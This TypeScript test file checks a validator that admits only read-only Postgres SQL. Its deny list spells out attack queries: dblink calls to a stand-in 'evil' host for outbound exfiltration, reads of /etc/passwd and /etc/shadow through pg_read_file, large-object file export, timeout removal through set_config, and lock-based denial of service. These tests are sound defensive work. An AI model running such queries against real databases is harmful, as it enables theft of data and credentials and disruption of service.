import { stripComments, validateReadOnlySql } from './sql-validator';

const limits = { maxSqlLength: 8192 };

describe('stripComments', () => {
  it('removes line and block comments', () => {
    expect(stripComments('SELECT 1 -- trailing')).toMatch(/SELECT 1/);
    expect(stripComments('SELECT /* block */ 1')).toMatch(/SELECT\s+1/);
  });
});

describe('validateReadOnlySql', () => {
  const allow = [
    'SELECT 1',
    'select * from users limit 10',
    'WITH t AS (SELECT 1) SELECT * FROM t',
    'EXPLAIN SELECT 1',
    'SHOW TIMEZONE',
    '  SELECT 1  ;',
  ];

  const deny: Array<[string, RegExp]> = [
    ['INSERT INTO users (id) VALUES (1)', /dangerous keyword/i],
    ['UPDATE users SET x=1', /dangerous keyword/i],
    ['DELETE FROM users', /dangerous keyword/i],
    ['DROP TABLE users', /dangerous keyword/i],
    ['ALTER TABLE users ADD COLUMN x int', /dangerous keyword/i],
    ['CREATE TABLE t (id int)', /dangerous keyword/i],
    ['TRUNCATE users', /dangerous keyword/i],
    ['GRANT SELECT ON users TO public', /dangerous keyword/i],
    ['COPY users FROM stdin', /dangerous keyword/i],
    ['VACUUM users', /dangerous keyword/i],
    ['SELECT pg_sleep(1)', /dangerous keyword/i],
    ['SELECT pg_terminate_backend(1)', /dangerous keyword/i],
    ['SELECT 1; SELECT 2', /multiple statements/i],
    ['DO $$ BEGIN END $$', /DO blocks|only SELECT/i],
    ['SET search_path = public', /only SELECT|SET/i],
    [
      'WITH writer AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM writer',
      /CTE containing a write|dangerous keyword/i,
    ],
    ['', /empty sql/i],
    // C2: validator gaps
    // SELECT col INTO new_table FROM old_table is Postgres "CREATE TABLE AS"
    // semantics — writes. No INSERT/CREATE keyword appears textually so the
    // word-list didn't catch it.
    [
      'SELECT id INTO new_users FROM users',
      /SELECT INTO is not allowed|dangerous keyword/i,
    ],
    [
      'SELECT * INTO new_users FROM users WHERE x=1',
      /SELECT INTO is not allowed|dangerous keyword/i,
    ],
    // dblink / dblink_exec — outbound exfil from inside Postgres
    [
      "SELECT * FROM dblink('host=evil port=5432 user=foo','SELECT 1') AS t(x int)",
      /dangerous keyword/i,
    ],
    [
      "SELECT dblink_exec('host=evil','INSERT INTO target VALUES (1)')",
      /dangerous keyword/i,
    ],
    // pg_read_file / pg_read_binary_file — filesystem read via superuser/role
    ["SELECT pg_read_file('/etc/passwd')", /dangerous keyword/i],
    ["SELECT pg_read_binary_file('/etc/shadow')", /dangerous keyword/i],
    // lo_import / lo_export — large-object filesystem I/O
    ["SELECT lo_import('/tmp/x')", /dangerous keyword/i],
    ["SELECT lo_export(1234,'/tmp/x')", /dangerous keyword/i],
    // Security HIGH-1: set_config bypassed the SET regex because `_` is a
    // word-char, so `\bSET\b` doesn't match in `set_config`. Now in deny-words.
    [
      "SELECT set_config('statement_timeout', '0', false)",
      /dangerous keyword/i,
    ],
    // Security HIGH-2: lock-contention DoS surface
    ['SELECT pg_advisory_lock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_xact_lock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_unlock(1)', /dangerous keyword/i],
    ['SELECT pg_advisory_unlock_all()', /dangerous keyword/i],
    // Security HIGH-2: schema-size info leak (bypasses allowed_tables)
    ["SELECT pg_relation_size('secret_audit')", /dangerous keyword/i],
    ["SELECT pg_total_relation_size('secret_audit')", /dangerous keyword/i],
    ["SELECT pg_database_size('app')", /dangerous keyword/i],
    ["SELECT pg_tablespace_size('pg_default')", /dangerous keyword/i],
    // Security HIGH-2: FDW config leak
    ['SELECT * FROM postgres_fdw_get_connections()', /dangerous keyword/i],
    ["SELECT postgres_fdw_disconnect('srv')", /dangerous keyword/i],
    ['SELECT postgres_fdw_disconnect_all()', /dangerous keyword/i],
    // Security HIGH-2: WAL pollution (writes even under RO transaction)
    [
      "SELECT pg_logical_emit_message(true, 'tag', 'payload')",
      /dangerous keyword/i,
    ],
    // Security defense-in-depth: session-GUC introspection
    ["SELECT current_setting('app.tenant_id')", /dangerous keyword/i],
  ];

  for (const sql of allow) {
    it(`allows: ${sql}`, () => {
      const verdict = validateReadOnlySql(sql, limits);
      expect(verdict.ok).toBe(true);
    });
  }

  for (const [sql, reason] of deny) {
    it(`denies: ${sql}`, () => {
      const verdict = validateReadOnlySql(sql, limits);
      expect(verdict.ok).toBe(false);
      if (verdict.ok === false) {
        expect(verdict.reason).toMatch(reason);
      }
    });
  }

  it('rejects oversized sql', () => {
    const huge = 'SELECT ' + '1,'.repeat(5000) + '1';
    const verdict = validateReadOnlySql(huge, { maxSqlLength: 100 });
    expect(verdict.ok).toBe(false);
    if (verdict.ok === false) expect(verdict.reason).toMatch(/max length/);
  });

  it('allows SET LOCAL (transaction-scoped only)', () => {
    // SET LOCAL is explicitly allowed in the SET regex, but the statement must
    // still start with SELECT/WITH/SHOW/EXPLAIN — so SET LOCAL alone is denied
    // at the "allowed start" gate, which is correct for read-only user input.
    const verdict = validateReadOnlySql('SET LOCAL statement_timeout=1', limits);
    expect(verdict.ok).toBe(false);
  });
});
